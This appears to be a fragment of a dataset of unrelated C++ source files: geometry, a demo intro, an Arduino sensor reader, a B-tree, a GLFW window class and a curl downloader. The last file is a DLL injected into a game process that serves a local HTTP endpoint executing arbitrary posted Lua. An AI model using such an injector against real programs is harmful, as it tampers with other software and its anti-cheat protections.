    "#include \"../headers/triangle.h\"\n\nTriangle::Triangle(const vector3 &A, const vector3 &B, const vector3 &C)  \n{\n    this->verts.push_back(A);\n    this->verts.push_back(B);\n    this->verts.push_back(C);\n}\n\n// M\u00f6ller\u2013Trumbore intersection algorithm\nbool Triangle::hit_ray(const Ray &ray, float t0, float t1, hit_record &rec) const {\n\n    const float EPSILON = 0.0000001;\n    vector3 edge1 = verts[1] - verts[0];\n    vector3 edge2 = verts[2] - verts[0];\n\n    // This ray is parallel to this triangle.\n    vector3 ray_cross_e2 = ray.direction ^ edge2; // Find normal of plane created by the ray and an arbitrary edge\n    float determinant = edge1 * ray_cross_e2; // Angle between normal of plane and the other edge of the triangle\n    // If the new normal is near parallel to the edge, then the dot product (cosine) approaches 1\n    // And if that normal is parallel, that means the original ray is near perpendicular to the triangle\n    // Otherwise, if the new normal is near perpendicular to the edge then the cosine approaches 0\n    // And if that new normal is perpendicular, that means the original ray is near parallel to the triangle\n    // So if the angle between the normal and the other edge is near perpendicular,\n    // Then the dot product between them (cosine) is near 0 \n    // Meaning the original ray that created the plane/normal with the other edge was near parallel to the triangle\n    // Thus we return this is not an intersection\n    if (determinant > -EPSILON && determinant < EPSILON)\n        return false;    \n\n    // Determinent\n    float inv_det = 1.0 / determinant;\n    \n    // First barycentric coordinate\n    vector3 s = ray.origin - verts[0];\n    float beta = inv_det * (s * ray_cross_e2);\n    if (beta < 0.0 || beta > 1.0)\n        return false;\n\n    // Second barycentric coordinate\n    vector3 s_cross_e1 = s ^ edge1;\n    float gamma = inv_det * (ray.direction * s_cross_e1);\n    if (gamma < 0.0 || beta + gamma > 1.0)\n        return false;\n\n    //Compute t to find out where the intersection point is on the line.\n    float t = inv_det * (edge2 * s_cross_e1);\n\n    if (t > EPSILON && t >= t0 && t <= t1) // ray intersection\n    {\n        rec.t = t;\n        rec.normal = (edge1 ^ edge2).normalize();\n        return true;\n    }\n    else // This means that there is a line intersection but not a ray intersection.\n        return false;\n}\n",
    "/// \\file\n/// Main intro code.\n\n//######################################\n// Include #############################\n//######################################\n\n#include \"dnload.h\"\n\n#if defined(USE_LD)\n#include \"fps_counter.hpp\"\n#include \"glsl_program.hpp\"\n#include \"glsl_pipeline.hpp\"\n#include \"image_png.hpp\"\n#include <cstdio>\n#include <iomanip>\n#include <iostream>\n#include <sstream>\n#include <boost/exception/diagnostic_information.hpp>\n#include <boost/filesystem.hpp>\n#include <boost/program_options.hpp>\nnamespace fs = boost::filesystem;\nnamespace po = boost::program_options;\n#elif !defined(DISABLE_SYNTH)\n#include \"synth.h\"\n#endif\n\n//######################################\n// Define ##############################\n//######################################\n\n#if !defined(DISPLAY_MODE)\n/// Screen mode.\n///\n/// Negative values windowed.\n/// Positive values fullscreen.\n#define DISPLAY_MODE -1080\n#endif\n\n#if !defined(RESOLUTION_DIVISOR)\n/// Resolution divisor for dot pattern.\n/// Larger values indicate sparser pattern.\n#define RESOLUTION_DIVISOR 5\n#endif\n\n/// \\cond\n#if (0 > (DISPLAY_MODE))\n#define SCREEN_F 0\n#define SCREEN_H (-(DISPLAY_MODE))\n#elif (0 < (DISPLAY_MODE))\n#define SCREEN_F 1\n#define SCREEN_H (DISPLAY_MODE)\n#else\n#error \"invalid display mode (pre)\"\n#endif\n#if ((800 == SCREEN_H) || (1200 == SCREEN_H))\n#define SCREEN_W ((SCREEN_H / 10) * 16)\n#else\n#define SCREEN_W (((SCREEN_H * 16) / 9) - (((SCREEN_H * 16) / 9) % 4))\n#endif\n#if !defined(RESOLUTION_X)\n#define RESOLUTION_X (SCREEN_W / RESOLUTION_DIVISOR)\n#endif\n#if !defined(RESOLUTION_Y)\n#define RESOLUTION_Y (SCREEN_H / RESOLUTION_DIVISOR)\n#endif\n/// \\endcond\n\n/// Size of one sample in bytes.\n#define AUDIO_SAMPLE_SIZE 4\n\n/// \\cond\n#if (4 == AUDIO_SAMPLE_SIZE)\n#define AUDIO_SAMPLE_TYPE_SDL AUDIO_F32SYS\ntypedef float sample_t;\n#elif (2 == AUDIO_SAMPLE_SIZE)\n#define AUDIO_SAMPLE_TYPE_SDL AUDIO_S16SYS\ntypedef int16_t sample_t;\n#elif (1 == AUDIO_SAMPLE_SIZE)\n#define AUDIO_SAMPLE_TYPE_SDL AUDIO_U8\ntypedef uint8_t sample_t;\n#else\n#error \"invalid audio sample size\"\n#endif\n#define AUDIO_POSITION_SHIFT (9 - (4 / sizeof(sample_t)))\n/// \\endcond\n\n/// Audio channels.\n#define AUDIO_CHANNELS 2\n\n/// Audio samplerate.\n#define AUDIO_SAMPLERATE 44100\n\n/// Audio byterate.\n#define AUDIO_BYTERATE (AUDIO_CHANNELS * AUDIO_SAMPLERATE * AUDIO_SAMPLE_SIZE)\n\n/// Intro length (in bytes of audio).\n#define INTRO_LENGTH (111 * AUDIO_BYTERATE)\n\n/// Intro start position (in seconds).\n#define INTRO_START (0 * AUDIO_BYTERATE)\n\n/// Noise volume size (one side).\n#define VOLUME_SIDE 64\n\n/// Noise volume size (elements).\n#define NOISE_SIZE (VOLUME_SIDE * VOLUME_SIDE * VOLUME_SIDE * 3)\n\n/// Noise buffer size (bytes).\n#define NOISE_BUFFER_LENGTH (NOISE_SIZE * sizeof(int16_t))\n\n#if !defined(START_PLAY_POS)\n/// Unless explicitly defined, playback starts at beginning of buffer.\n#define START_PLAY_POS 0\n#endif\n\n/// Audio buffer length (bytes, should be larger than intro length for safety).\n#define AUDIO_BUFFER_LENGTH (INTRO_LENGTH * 9 / 8 + START_PLAY_POS)\n\n//######################################\n// Global data #########################\n//######################################\n\n/// Buffer to use as generic scratchpad for everything.\nstatic uint8_t g_scratch_buffer[(AUDIO_BUFFER_LENGTH > NOISE_BUFFER_LENGTH) ? AUDIO_BUFFER_LENGTH : NOISE_BUFFER_LENGTH];\n\n/// Audio buffer (offset into the scratch buffer).\nstatic uint8_t* g_audio_buffer = g_scratch_buffer + START_PLAY_POS;\n\n/// Current audio position.\nstatic int g_audio_position = INTRO_START;\n\n#if defined(USE_LD)\n\n/// Developer mode global toggle.\nstatic bool g_flag_developer = false;\n\n/// Record mode global toggle.\nstatic bool g_flag_record = false;\n\n/// Silent mode global toggle.\nstatic bool g_flag_silent = false;\n\n/// Usage blurb.\nstatic std::string_view g_usage(\"\"\n        \"Usage: olkiluoto_3-2-1 <options>\\n\"\n        \"For Assembly 2024 4k intro compo.\\n\"\n        \"Release version does not pertain to any size limitations.\\n\");\n\n/// Wave file to use for loading music in non-minified mode where the synth is unlikely to work.\nstatic std::string_view g_synth_test_input_file(\"olkiluoto_3-2-1.wav\");\n\n#else\n\n/// Developer mode disabled.\n#define g_flag_developer 0\n\n#endif\n\n//######################################\n// Global functions ####################\n//######################################\n\n/// Global SDL window storage.\nSDL_Window *g_sdl_window;\n\n/// Swap buffers.\n///\n/// Uses global data.\nstatic void swap_buffers()\n{\n    dnload_SDL_GL_SwapWindow(g_sdl_window);\n}\n\n/// Tear down initialized systems.\n///\n/// Uses global data.\nstatic void teardown()\n{\n    dnload_SDL_Quit();\n}\n\n#if defined(USE_LD)\n\n/// OpenGL error check.\nstatic void gl_error_check()\n{\n    auto err = glGetError();\n    if (err != GL_NO_ERROR)\n    {\n        std::ostringstream sstr;\n        sstr << \"OpenGL error: \" << err;\n        BOOST_THROW_EXCEPTION(std::runtime_error(sstr.str()));\n    }\n}\n\n#endif\n\n//######################################\n// Random ##############################\n//#################",
    "#include <Arduino.h>\n#include <SPI.h>\n#include <Wire.h>\n#include <Adafruit_AHTX0.h>\n#include <Adafruit_GFX.h>\n#include <Adafruit_SSD1306.h>\n#include <SoftwareSerial.h>\n#include <ModbusMaster.h>\n//==============================================================================\n#define dw digitalWrite\n#define dr digitalRead\n#define COI 2\n#define RS_TX 3\n#define RS_RX 4\n#define RELAY1 5\n#define RELAY2 6\n#define NUT1 7\n#define NUT2 8\n#define NUT3 8\n#define LED1 10\n#define LED2 11\n#define ESP_RX 12\n#define ESP_TX 13\n//---------------------------------------\n#define SCREEN_ADDRESS 0x3D\n#define SCREEN_WIDTH 128 // OLED display width, in pixels\n#define SCREEN_HEIGHT 64 // OLED display height, in pixels\n#define OLED_RESET -1    // Reset pin # (or -1 if sharing Arduino reset pin)\n//==============================================================================\nAdafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);\nSoftwareSerial RS485Serial(RS_RX, RS_TX); // RX, TX\nSoftwareSerial ESPSerial(ESP_RX, ESP_TX); // RX, TX\nModbusMaster node;\nAdafruit_AHTX0 aht;\n//==============================================================================\nsensors_event_t humidity, temp;\nuint8_t address[][6] = {\"1Node\", \"2Node\"};\nfloat ph = -1.0, soilMoisture = -1.0, soilTemp = -1.0, EC = -1.0, n = -1.0, p = -1.0, k = -1.0;\nunsigned long lastCoiHigh, lastSend, lastCheckSensor, lastPress1, lastPress2, lastPress3;\nint buttonState1, buttonState2, buttonState3;\nint lastButtonState1, lastButtonState2, lastButtonState3;\nint mode = 0; // mode hien thi man hinh oled\n//==============================================================================\n\n#define FRAME_DELAY (42)\n#define FRAME_WIDTH (48)\n#define FRAME_HEIGHT (48)\n#define FRAME_COUNT (sizeof(frames) / sizeof(frames[0]))\nconst byte PROGMEM frames[][288] = {\n    {0, 0, 0, 0, 0, 3, 192, 0, 0, 2, 64, 0, 0, 6, 96, 0, 1, 4, 32, 128, 3, 132, 33, 192, 4, 124, 62, 32, 12, 32, 12, 48, 4, 0, 0, 32, 2, 0, 0, 64, 3, 0, 0, 192, 3, 3, 192, 192, 2, 12, 48, 64, 30, 8, 16, 124, 96, 16, 8, 14, 64, 16, 8, 6, 64, 16, 8, 6, 112, 16, 8, 14, 30, 8, 16, 120, 2, 4, 48, 64, 3, 3, 192, 192, 3, 0, 0, 192, 2, 0, 0, 64, 4, 0, 0, 32, 12, 48, 4, 48, 4, 124, 62, 32, 3, 132, 33, 192, 1, 4, 32, 128, 0, 6, 96, 0, 0, 2, 64, 0, 0, 3, 192, 0, 0, 0, 0, 0},\n};\n//==============================================================================\nvoid displayStartScreen()\n{\n  display.clearDisplay();\n  display.drawBitmap(40, 8, frames[0], FRAME_WIDTH, FRAME_HEIGHT, 1);\n  display.display();\n  delay(FRAME_DELAY);\n}\n//==============================================================================\n// read aht sensor and save to humidity and temp\nvoid readAHT()\n{\n  aht.getEvent(&humidity, &temp);\n  Serial.print(\"Humidity: \");\n  Serial.print(humidity.relative_humidity);\n  Serial.print(\" %\\t\");\n  Serial.print(\"Temperature: \");\n  Serial.print(temp.temperature);\n  Serial.println(\" *C\");\n}\n\n//==============================================================================\n// toggle led for x times y ms\nvoid toggleLED(int led, int delayTime, int times)\n{\n  for (int i = 0; i < times; i++)\n  {\n    digitalWrite(led, HIGH);\n    delay(delayTime);\n    digitalWrite(led, LOW);\n    delay(delayTime);\n  }\n}\n//==============================================================================\n// read rs485\nvoid readRS485()\n{\n  uint8_t result;\n  result = node.readHoldingRegisters(0x06, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    ph = (float)node.receive() / 100.0;\n    Serial.print(ph);\n    Serial.print('\\t');\n  }\n  result = node.readHoldingRegisters(0x15, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    EC = (float)node.receive();\n    Serial.print(EC);\n    Serial.print('\\t');\n  }\n  result = node.readHoldingRegisters(0x1e, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    n = (float)node.receive();\n    Serial.print(n);\n    Serial.print('\\t');\n  }\n  result = node.readHoldingRegisters(0x1f, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    p = (float)node.receive();\n    Serial.print(p);\n    Serial.print('\\t');\n  }\n  result = node.readHoldingRegisters(0x20, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    k = (float)node.receive();\n    Serial.print(k);\n    Serial.print('\\t');\n  }\n  result = node.readHoldingRegisters(0x12, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    soilMoisture = (float)node.receive() / 10.0;\n    Serial.print(soilMoisture);\n    Serial.print('\\t');\n  }\n  result = node.readHoldingRegisters(0x13, 1);\n  if (result == node.ku8MBSuccess)\n  {\n    k = (float)node.receive() / 10.0;\n    Serial.print(k);\n    Serial.print('\\t');\n  }\n}\n//==============================================================================\n// send data to esp using only one string\nvoid sendDataToESP()\n{\n  String data = String(ph) + \",\" + String(EC) + \",\" + String(n) + \",\" + String(p) + \",\" + String(k) + \",\" + String(soilMoisture) + \",\" + String(soilTemp) + \",\" + String(humidity.relative_humidity) + \",\" + String(temp.temperature);\n  ESPSerial.println(data);\n}\n//=======================",
    "#include\"BTree.h\"\n\nBNode::BNode(int mindeg, bool leaf)\n{\n\tMindegree = mindeg, isleaf = leaf, count = 0;\n\tdata = new int[2 * Mindegree - 1];\n\tnext = new BNode *[2 * Mindegree];\n}\n\nBNode * BNode::Search(int x)\n{\n\tint cur = 0;\n\twhile (cur < count&&data[cur] < x)cur++;//find the first data >= x\n\tif (data[cur] == x)return this;\n\tif (isleaf)return NULL;\n\treturn next[cur]->Search(x);//just in this child\n}\n\nvoid BTree::Insert(int x)\n{\n\tif (!root)\n\t{\n\t\troot = new BNode(Mindegree, true);\n\t\troot->data[0] = x;\n\t\troot->count = 1;\n\t}\n\telse\n\t{\n\t\tif (root->count == 2 * Mindegree - 1)\n\t\t{\n\t\t\tBNode *node = new BNode(Mindegree, false);\n\t\t\tnode->next[0] = root;\n\t\t\tnode->Split(0, root);//Split root and move the middle data of root to node's 0th position\n\t\t\tnode->next[node->data[0] < x ? 1 : 0]->EasyInsert(x);\n\t\t\troot = node;\n\t\t}\n\t\telse root->EasyInsert(x);\n\t}\n}\n\nvoid BTree::Delete(int x)\n{\n\tif (!root)\n\t{\n\t\tcout << \"This tree is already empty\" << endl;\n\t\treturn;\n\t}\n\troot->Delete(x);\n\tif (!root->count)\n\t{\n\t\tBNode *tmp = root;\n\t\tif (root->isleaf)root = NULL;\n\t\telse root = root->next[0];\n\t\tdelete tmp;\n\t}\n}\n\nvoid BNode::Split(int index, BNode * node)//node split: (Mindegree - 1)<still>; 1<to this' (index)th position>; (Mindegree - 1)<to new brother>\n{\n\tassert(node->count == 2 * Mindegree - 1);//only called when (node->count == 2 * Mindegree - 1)\n\tBNode *newnode = new BNode(node->Mindegree, node->isleaf);\n\tnewnode->count = Mindegree - 1;\n\tfor (int i = 0; i < Mindegree - 1; i++)newnode->data[i] = node->data[i + Mindegree];//Copy the last (Mindegree - 1) data\n\tif (!node->isleaf)for (int i = 0; i < Mindegree; i++)newnode->next[i] = node->next[i + Mindegree];//Copy the last Mindegree children\n\tnode->count = Mindegree - 1;\n\tfor (int i = count - 1; i >= index; i--)data[i + 1] = data[i];\n\tdata[index] = node->data[Mindegree - 1];\n\tfor (int i = count; i > index; i--)next[i + 1] = next[i];\n\tnext[index + 1] = newnode;\n\tcount++;\n}\n\nvoid BNode::EasyInsert(int x)\n{\n\tassert(count < Mindegree * 2 - 1);//only called when this node is not full\n\tint cur = count - 1;\n\tif (isleaf)//insert in this node\n\t{\n\t\twhile (cur >= 0 && data[cur] > x)data[cur + 1] = data[cur], cur--;//find a place and move greater data right\n\t\tdata[cur + 1] = x, count++;\n\t}\n\telse//insert in a child\n\t{\n\t\twhile (cur >= 0 && data[cur] > x)cur--;//find a place\n\t\tif (next[cur + 1]->count == 2 * Mindegree - 1)\n\t\t{\n\t\t\tSplit(cur + 1, next[cur + 1]);\n\t\t\tif (data[cur + 1] < x)cur++;//after split, find the place for x (leftchild or rightchild)\n\t\t}\n\t\tnext[cur + 1]->EasyInsert(x);\n\t}\n}\n\nvoid BNode::Delete(int x)\n{\n\tint index = GetIndex(x);\n\tif (index < count&&data[index] == x)//Main Deletion\n\t{\n\t\tif (isleaf)DeleteFromLeaf(index);\n\t\telse DeleteFromNonLeaf(index);\n\t}\n\telse//Return false or Delete in the child\n\t{\n\t\tif (isleaf)\n\t\t{\n\t\t\tcout << \"The data does not exist\" << endl;\n\t\t\treturn;\n\t\t}\n\t\tbool isinLastChild = (index == count ? true : false);\n\t\tif (next[index]->count < Mindegree)Fill(index);//give it more data\n\t\tif (isinLastChild&&count < index)next[index - 1]->Delete(x);//if islast && merged\n\t\telse next[index]->Delete(x);\n\t}\n}\n\nint BNode::GetIndex(int x)\n{\n\tint index = 0;\n\twhile (index < count&&data[index] < x)index++;\n\treturn index;\n}\n\nvoid BNode::DeleteFromLeaf(int index)\n{\n\tfor (int i = index + 1; i < count; i++)data[i - 1] = data[i];\n\tcount--;\n}\n\nvoid BNode::DeleteFromNonLeaf(int index)\n{\n\tint x = data[index];\n\tif (next[index]->count >= Mindegree)//if leftchild is ok then replace and delete in the leftchild\n\t{\n\t\tint MaxLess = FindMaxLess(index);\n\t\tdata[index] = MaxLess;\n\t\tnext[index]->Delete(MaxLess);\n\t}\n\telse if (next[index + 1]->count >= Mindegree)//if rightchild is ok then replace and delete in the rightchild\n\t{\n\t\tint MinGreater = FindMinGreater(index);\n\t\tdata[index] = MinGreater;\n\t\tnext[index + 1]->Delete(MinGreater);\n\t}\n\telse//both not ok, then merge. So the new node has ((Mindegree - 1) + 1 + (Mindegree - 1)) data, then delete x\n\t{\n\t\tMerge(index);\n\t\tnext[index]->Delete(x);\n\t}\n}\n\nvoid BNode::Fill(int index)\n{\n\tif (index&&next[index - 1]->count >= Mindegree)BorrowFromLeft(index);//if leftbrother is able\n\telse if (index != count && next[index + 1]->count >= Mindegree)BorrowFromRight(index);//if rightbrother is able\n\telse if (index != count)Merge(index);\n\telse Merge(index - 1);\n}\n\nint BNode::FindMinGreater(int index)\n{\n\tBNode *cur = next[index + 1];\n\twhile (!cur->isleaf)cur = cur->next[0];\n\treturn cur->data[0];\n}\n\nint BNode::FindMaxLess(int index)\n{\n\tBNode *cur = next[index];\n\twhile (!cur->isleaf)cur = cur->next[cur->count];\n\treturn cur->data[cur->count - 1];\n}\n\nvoid BNode::Merge(int index)\n{\n\tBNode *left = next[index];\n\tBNode *right = next[index + 1];\n\tleft->data[Mindegree - 1] = data[index];\n\tfor (int i = 0; i < right->count; i++)left->data[i + Mindegree] = right->data[i];\n\tif (!left->isleaf)for (int i = 0; i <= right->count; i++)left->next[i + Mindegree] = right->next[i];\n\tfor (int i = index + 1; i < count; i++)data[i - 1] = data[i];//fill the gap\n\tfor (int i = index + 2; i <= count; i",
    "#include \"Output.h\"\n\nvoid Output::printWelcome() {\n    std::cout << \"Welcome to the Basic DNA Profiler v1.0\\n\";\n    std::cout << \"Copyright (C) 2021, Selan R. dos Santos\\n\\n\";\n    std::cout << \"This program loads a DNA database and an unknown\\n\";\n    std::cout << \"DNA sequence and tries to find a match between\\n\";\n    std::cout << \"the input DNA sequences and the DNA database.\\n\\n\";\n}\n\nvoid Output::printReadingFile(const std::string& fileName) {\n    std::cout << \"[Preparing to read the \" << fileName << \" file]\\n\";\n}\n\nvoid Output::printFilesRead() {\n    std::cout << \"[Input files successfully read... Please wait...]\\n\";\n}\n\nvoid Output::printSearching() {\n    std::cout << \"[Searching for a match... Please wait...]\\n\\n\";\n}\n\nvoid Output::printMatch(const std::string& name, const std::unordered_map<std::string, int>& profile) {\n    std::cout << \"Match ID [99.9%]: \" << name << \"\\n\\n\";\n    std::cout << \"DNA Profile:\\n\";\n    for (const auto& pair : profile) {\n        std::cout << pair.first << \" [x\" << pair.second << \"] \";\n    }\n    std::cout << \"\\n\";\n}\n\nvoid Output::printNoMatch() {\n    std::cout << \">> Sorry, no match in our database.\\n\";\n}\n",
    "#include \"fdpch.h\"\n\n#include \"WindowsWindow.h\"\n\n#include \"Fodo/Events/KeyEvent.h\"\n#include \"Fodo/Events/MouseEvent.h\"\n#include \"Fodo/Events/ApplicationEvent.h\"\n\n#include <glad/glad.h>\n\nnamespace Fodo {\n\tstatic bool s_GLFWInitialized = false;\n\n\tstatic void GLFWErrorCallback(int error, const char* description)\n\t{\n\t\tFD_CORE_ERROR(\"GLFW Error ({0}): {1}\", error, description);\n\t}\n\n\tWindow* Window::Create(const WindowProps& props)\n\t{\n\t\treturn new WindowsWindow(props);\n\t}\n\n\tWindowsWindow::WindowsWindow(const WindowProps& props)\n\t{\n\t\tInit(props);\n\t}\n\n\tWindowsWindow::~WindowsWindow()\n\t{\n\t\tShutdown();\n\t}\n\n\tvoid WindowsWindow::Init(const WindowProps& props)\n\t{\n\t\tm_Data.Title = props.Title;\n\t\tm_Data.Width = props.Width;\n\t\tm_Data.Height = props.Height;\n\n\t\tFD_CORE_INFO(\"Creating window {0} ({1}, {2})\", props.Title, props.Width, props.Height);\n\n\t\tif (!s_GLFWInitialized)\n\t\t{\n\t\t\t// TODO: glfwTerminate on system shutdown\n\t\t\tint success = glfwInit();\n\t\t\tFD_CORE_ASSERT(success, \"Could not initialize GLFW!\");\n\n\t\t\tglfwSetErrorCallback(GLFWErrorCallback);\n\n\t\t\ts_GLFWInitialized = true;\n\t\t}\n\n\t\tm_Window = glfwCreateWindow((int)m_Data.Width, (int)m_Data.Height, m_Data.Title.c_str(), nullptr, nullptr);\n\t\tglfwMakeContextCurrent(m_Window);\n\t\tint status = gladLoadGLLoader((GLADloadproc)glfwGetProcAddress);\n\t\tFD_CORE_ASSERT(status, \"Failed to initialize GLAD!\");\n\t\tglfwSetWindowUserPointer(m_Window, &m_Data);\n\t\tSetVSync(true);\n\n\t\t// Set GLFW callbacks\n\t\tglfwSetWindowSizeCallback(m_Window, [](GLFWwindow* window, int width, int height)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\t\t\tdata.Width = width;\n\t\t\tdata.Height = height;\n\n\t\t\tWindowResizeEvent event(width, height);\n\t\t\tdata.EventCallback(event);\n\t\t});\n\n\t\tglfwSetWindowCloseCallback(m_Window, [](GLFWwindow* window)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\t\t\tWindowCloseEvent event;\n\t\t\tdata.EventCallback(event);\n\t\t});\n\n\t\tglfwSetKeyCallback(m_Window, [](GLFWwindow* window, int key, int scancode, int action, int mods)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\n\t\t\tswitch (action)\n\t\t\t{\n\t\t\t\tcase GLFW_PRESS:\n\t\t\t\t{\n\t\t\t\t\tKeyPressedEvent event(key, 0);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tcase GLFW_RELEASE:\n\t\t\t\t{\n\t\t\t\t\tKeyReleasedEvent event(key);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tcase GLFW_REPEAT:\n\t\t\t\t{\n\t\t\t\t\tKeyPressedEvent event(key, 1);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\tglfwSetCharCallback(m_Window, [](GLFWwindow* window, unsigned int keycode)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\n\t\t\tKeyTypedEvent event(keycode);\n\t\t\tdata.EventCallback(event);\n\t\t});\n\n\t\tglfwSetMouseButtonCallback(m_Window, [](GLFWwindow* window, int button, int action, int mods)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\n\t\t\tswitch (action)\n\t\t\t{\n\t\t\t\tcase GLFW_PRESS:\n\t\t\t\t{\n\t\t\t\t\tMouseButtonPressedEvent event(button);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\n\t\t\t\tcase GLFW_RELEASE:\n\t\t\t\t{\n\t\t\t\t\tMouseButtonReleasedEvent event(button);\n\t\t\t\t\tdata.EventCallback(event);\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t});\n\n\t\tglfwSetScrollCallback(m_Window, [](GLFWwindow* window, double xOffset, double yOffset)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\n\t\t\tMouseScrolledEvent event((float)xOffset, (float)yOffset);\n\t\t\tdata.EventCallback(event);\n\t\t});\n\n\t\tglfwSetCursorPosCallback(m_Window, [](GLFWwindow* window, double xPos, double yPos)\n\t\t{\n\t\t\tWindowData& data = *(WindowData*)glfwGetWindowUserPointer(window);\n\n\t\t\tMouseMovedEvent event((float)xPos, (float)yPos);\n\t\t\tdata.EventCallback(event);\n\t\t});\n\t}\n\n\tvoid WindowsWindow::Shutdown()\n\t{\n\t\tglfwDestroyWindow(m_Window);\n\t}\n\n\tvoid WindowsWindow::OnUpdate()\n\t{\n\t\tglfwPollEvents();\n\t\tglfwSwapBuffers(m_Window);\n\t}\n\n\tvoid WindowsWindow::SetVSync(bool enabled)\n\t{\n\t\tif (enabled)\n\t\t\tglfwSwapInterval(1);\n\t\telse\n\t\t\tglfwSwapInterval(0);\n\n\t\tm_Data.VSync = enabled;\n\t}\n\n\tbool WindowsWindow::IsVSync() const\n\t{\n\t\treturn m_Data.VSync;\n\t}\n}",
    "#include <iostream>\n#include <fstream>\n#include <sstream>\n#include <thread>\n#include <vector>\n#include <curl/curl.h>\n#include <cstdlib>\n\nusing namespace std;\n\nsize_t WriteCallback(void* ptr, size_t size, size_t nmemb, std::ofstream* stream) {\n    stream->write(static_cast<char*>(ptr), size * nmemb);\n    return size * nmemb;\n}\n\nvoid downloadPart(const std::string& url, long start, long end, const std::string& output) {\n    CURL* curl;\n    CURLcode res;\n    curl = curl_easy_init();\n    if (curl) {\n        std::ostringstream range;\n        range << start << \"-\" << end;\n\n        std::ofstream outFile(output, std::ios::binary);\n        if (!outFile.is_open()) {\n            std::cerr << \"Error: Could not open file \" << output << std::endl;\n            curl_easy_cleanup(curl);\n            return;\n        }\n\n        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());\n        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);\n        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &outFile);\n        curl_easy_setopt(curl, CURLOPT_RANGE, range.str().c_str());\n\n        res = curl_easy_perform(curl);\n\n        if (res != CURLE_OK) {\n            std::cerr << \"Error: \" << curl_easy_strerror(res) << std::endl;\n        }\n\n        curl_easy_cleanup(curl);\n        outFile.close();\n    } else {\n        std::cerr << \"Error: Could not initialize CURL\" << std::endl;\n    }\n}\n\nvoid mergeParts(const std::vector<std::string>& parts, const std::string& output) {\n    std::ofstream outFile(output, std::ios::binary);\n    if (!outFile.is_open()) {\n        std::cerr << \"Error: Could not open file \" << output << std::endl;\n        return;\n    }\n\n    for (const auto& part : parts) {\n        std::ifstream inFile(part, std::ios::binary);\n        if (!inFile.is_open()) {\n            std::cerr << \"Error: Could not open file \" << part << std::endl;\n            continue;\n        }\n        outFile << inFile.rdbuf();\n        inFile.close();\n        std::remove(part.c_str());\n    }\n    outFile.close();\n}\n\nint main() {\n    std::string url;\n    std::cout << \"ENTER THE LINK ADDRESS: \";\n    std::getline(std::cin, url); \n    std::string outputFileName = \"largefile.zip\";\n    long fileSize;\n    std::cout << \"ENTER THE SIZE OF ZIP FILE IN BYTES: \";\n    std::cin >> fileSize;  // Replace with the actual file size in bytes\n    int numThreads = 4;\n\n    std::vector<thread> threads;\n    std::vector<std::string> partFiles;\n\n    long partSize = fileSize / numThreads;\n\n    for (int i = 0; i < numThreads; ++i) {\n        long start = i * partSize;\n        long end = (i == numThreads - 1) ? fileSize - 1 : (start + partSize - 1);\n        std::string partFileName = \"part\" + std::to_string(i);\n        partFiles.push_back(partFileName);\n\n        threads.emplace_back(downloadPart, url, start, end, partFileName);\n    }\n\n    for (auto& thread : threads) {\n        thread.join();\n    }\n\n    mergeParts(partFiles, outputFileName);\n\n    std::cout << \"Download completed: \" << outputFileName << std::endl;\n\n    return 0;\n}\n",
    "constexpr auto PORT = 8012;\n\n#define WIN32_LEAN_AND_MEAN\n#include <windows.h>\n\n#include <iostream>\n#include <thread>\n\n// lib\n#include <httplib/httplib.h>\n\n// own\n#include <sdk/get_interface.hpp>\n#include <sdk/lua_shared.hpp>\n#include <sdk/lua_interface.hpp>\n\nvoid dll_thread(HINSTANCE instance_dll) {\n\tDisableThreadLibraryCalls(instance_dll);\n\n\tauto lua_shared = reinterpret_cast<CLuaShared*>(get_interface(\"lua_shared.dll\", \"LUASHARED003\"));\n\n\thttplib::Server server;\n\n\tserver.Post(\"/script\", [lua_shared](const httplib::Request& request, httplib::Response& response) {\n\t\tauto lua_interface = reinterpret_cast<CLuaInterface*>(lua_shared->get_current_lua_interface());\n\n\t\tif (const char* result = lua_interface->run_buffer(request.body.c_str())) {\n\t\t\tresponse.set_content(result, \"text/plain\");\n\t\t}\n\t});\n\n\tserver.listen(\"127.0.0.1\", PORT);\n\n\tFreeLibrary(instance_dll);\n}\n\nBOOL DllMain(HINSTANCE instance_dll, DWORD reason, LPVOID reserved) {\n\tif (reason == DLL_PROCESS_ATTACH) {\n\t\tstd::thread(dll_thread, instance_dll).detach();\n\t}\n\n    return TRUE;\n}",
